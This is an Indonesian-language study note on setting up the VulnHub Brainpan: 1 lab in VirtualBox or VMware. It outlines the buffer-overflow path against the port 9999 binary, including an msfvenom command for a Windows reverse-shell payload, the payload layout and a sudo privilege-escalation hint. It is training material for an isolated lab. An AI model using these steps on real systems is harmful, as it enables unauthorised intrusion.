# 🎯 Lab — Brainpan (Setup)

> [!summary] Ringkasan
> **Brainpan: 1** (author *superkojiman*, rilis 20 Mar 2013) adalah mesin **boot-to-root Linux** klasik yang **unik di vault ini**: satu-satunya yang mengajarkan **buffer overflow / exploit development** dari nol. Targetnya sebuah binari rentan di **port 9999**, kamu fuzz → cari offset → kontrol `EIP` → suntik shellcode untuk RCE. Formatnya **VirtualBox OVA** di dalam arsip `.zip`. Catatan ini = panduan setup untuk **VirtualBox** dan **VMware** + langkah boot-to-root khas BOF.

**Bagian dari:** [[Lab — VulnHub]]
**Prasyarat:** [[Setup Lab (Virtualisasi)]], [[Lab — Setup Jaringan Lab]], [[Scanning & Enumeration]], [[Exploitation & Metasploit]]

> [!info] Halaman resmi
> https://www.vulnhub.com/entry/brainpan-1,51/

> [!note] Kenapa tetap relevan walau OSCP 2024+ hapus BOF
> Ujian OSCP versi baru memang **tak lagi menguji buffer overflow**, tapi BOF tetap **fondasi penting** untuk paham cara kerja exploit, register, dan memori. Brainpan = tempat aman & klasik untuk belajar konsepnya tanpa teori berat.

---

## 🧠 Info Mesin

| Atribut | Nilai |
|---|---|
| Nama | Brainpan: 1 |
| File | `Brainpan.zip` (~809 MB) berisi **OVA** |
| Format asli | VirtualBox OVA (disk VDI) |
| OS | Linux (menjalankan binari Windows via WINE di port 9999) |
| Jaringan | **DHCP enabled**; IP otomatis |
| Login awal | ❌ tidak ada (cari IP sendiri) |
| Tujuan | boot-to-root via **buffer overflow** |
| Kesulitan | intermediate (konsep BOF) |
| Pintu masuk | binari rentan **port 9999** → **stack buffer overflow** → RCE |

> [!danger] Pakai Host-Only
> Jalankan Brainpan di **Host-Only** — jangan Bridged. Karena kamu akan mengirim shellcode & membuka reverse shell, isolasi jaringan itu wajib. Lihat [[Setup Lab (Virtualisasi)]].

---

## 1️⃣ Unduh & ekstrak

```bash
wget https://download.vulnhub.com/brainpan/brainpan.zip
unzip brainpan.zip          # menghasilkan file .ova
```

## 2️⃣ Verifikasi integritas file (WAJIB)

```text
Brainpan.zip
  MD5  : 0F99E72F0703E4619B5E08604778F673
  SHA1 : E424613FD0137C0688A865623CCBB4D92DFE8209

brainpan.ova (di dalam zip)
  MD5  : FC0F163220B9884DF5DCC9CDC45361E4
```
Cek hash **arsip `.zip`** sebelum diekstrak:
```bash
md5sum brainpan.zip          # Linux
sha1sum brainpan.zip
```
```powershell
Get-FileHash brainpan.zip -Algorithm MD5     # Windows
Get-FileHash brainpan.zip -Algorithm SHA1
```
Harus **sama persis**. Kalau beda → unduh ulang.

---

## 🟦 Setup A — VirtualBox

### A.1 Import appliance
```text
VirtualBox → File → Import Appliance…
  → pilih brainpan.ova → Next
  → centang "Reinitialize the MAC address of all network cards"
  → Import
```

### A.2 Jaringan Host-Only
```text
VM brainpan → Settings → Network → Adapter 1
  Attached to: Host-only Adapter   (host-only yang SAMA dengan Kali)
```
DHCP-enabled → dapat IP otomatis di subnet host-only (mis. `192.168.56.0/24`).

### A.3 Snapshot bersih
```text
VirtualBox → brainpan → tab Snapshots → Take → nama: "fresh"
```

---

## 🟩 Setup B — VMware (Workstation / Player / Fusion)

Brainpan memang diuji author di VMware Player/Fusion, jadi biasanya mulus.

### B.1 Import OVA
```text
VMware → File → Open… → pilih brainpan.ova → beri nama → Import
```
Jika import ditolak karena pemeriksaan OVF ketat, paksa via **ovftool**:
```bash
ovftool --lax --allowExtraConfig brainpan.ova brainpan.vmx
```

### B.2 Set jaringan Host-Only (VMnet1)
```text
VM Settings → Network Adapter → Host-only (VMnet1)   — sama dgn Kali
```
Catat subnet VMnet1 dari **Virtual Network Editor**. Lihat [[Lab — Setup Jaringan Lab]].

### B.3 Jika jaringan mati (fix MAC)
Tutup VM, edit `brainpan.vmx`, hapus baris pengunci MAC lalu set generated:
```text
ethernet0.addressType = "generated"
# hapus: ethernet0.address / ethernet0.generatedAddress / ethernet0.checkMACAddress
```

### B.4 Snapshot bersih
```text
VM → Snapshot → Take Snapshot → nama: "fresh"
```

---

## 🎯 Setelah mesin hidup — boot-to-root (jalur BOF)

Sama untuk kedua hypervisor.

### 1. Temukan IP target (tak ada login!)
```bash
ip a
sudo netdiscover -i eth1 -r 192.168.56.0/24
nmap -sn 192.168.56.0/24
```

### 2. Enum & temukan binari rentan
```bash
nmap -sC -sV -p- <ip-brainpan>     # port 9999 (app) + 10000 (web)
nc <ip-brainpan> 9999              # interaksi langsung dgn binari
gobuster dir -u http://<ip>:10000 -w /usr/share/wordlists/dirb/common.txt
```
Di web (port 10000) biasanya ada link **download binari `brainpan.exe`** — unduh untuk dianalisis lokal.

### 3. Kembangkan exploit BOF (alur klasik)

> [!info] Teori lengkap di note terpisah
> Penjelasan mendalam tiap istilah (stack, EIP/ESP, return address, NOP sled, bad chars, JMP ESP, proteksi DEP/ASLR) ada di 👉 [[Buffer Overflow (Stack-Based)]]. Baca itu untuk paham **kenapa** tiap langkah di bawah dilakukan.

1. **Fuzzing** — kirim input makin panjang sampai binari crash.
2. **Cari offset** — `pattern_create.rb` / `pattern_offset.rb` (Metasploit) untuk titik kontrol **EIP**.
3. **Cek bad characters** & cari alamat **JMP ESP** (`mona.py` di Immunity Debugger, dijalankan di Windows analyzer).
4. **Generate shellcode** — `msfvenom -p windows/shell_reverse_tcp LHOST=<kali> LPORT=4444 -b "\x00" -f python`.
5. Susun payload: `[junk][EIP=JMP ESP][NOP sled][shellcode]` → kirim ke port 9999 → dapat shell.

### 4. Privesc ke root
Setelah dapat user shell → cek `sudo -l`. Brainpan terkenal punya privesc lewat **`sudo`** sebuah skrip (mis. `anansi_util` → manual/`man` escape). Lihat [[Privilege Escalation]].

Ambil **snapshot bersih** sebelum menyerang.

---

## 🧰 Tools

- **VirtualBox / VMware** — jalankan OVA.
- **unzip** — ekstrak `brainpan.zip`. **ovftool** — import paksa ke VMware.
- **netdiscover / nmap** — temukan IP & enum port.
- **nc, gobuster** — interaksi binari & enum web.
- **msf-pattern_create/offset, msfvenom, Immunity Debugger + mona.py** — exploit development BOF.
- **GTFOBins** — privesc via sudo.

## 🔗 Kaitan

- Hub VulnHub & langkah generik: [[Lab — VulnHub]].
- Mesin web boot-to-root lain (jalur beda): [[Lab — DC-1 (Setup)]], [[Lab — DC-2 (Setup)]], [[Lab — Symfonos 1 (Setup)]].
- Konsep exploit & payload: [[Exploitation & Metasploit]]. Privesc setelah shell: [[Privilege Escalation]].
- Setup jaringan & troubleshooting MAC: [[Lab — Setup Jaringan Lab]].
- Hub lab: [[Setup Lab (Virtualisasi)]].
- Alur serang: [[Reconnaissance (Information Gathering)]] → [[Scanning & Enumeration]] → [[Exploitation & Metasploit]] → [[Privilege Escalation]].

## 🎯 Latihan

- Setup `brainpan.ova` (**Host-Only**) sampai bisa `nc <ip> 9999` dari Kali.
- Selesaikan jalur **buffer overflow**: fuzz → cari offset EIP → JMP ESP → shellcode → shell → privesc sudo. Tulis write-up langkah BOF-mu di vault — ini catatan emas untuk diingat.

## 📖 Sumber

- **VulnHub — Brainpan: 1** — https://www.vulnhub.com/entry/brainpan-1,51/
- **Mirror download** — https://download.vulnhub.com/brainpan/brainpan.zip
- **GTFOBins** (sudo/man privesc) — https://gtfobins.github.io
- Brainpan klasik masuk daftar latihan BOF "OSCP-prep" (walau OSCP 2024+ tak lagi menguji BOF).
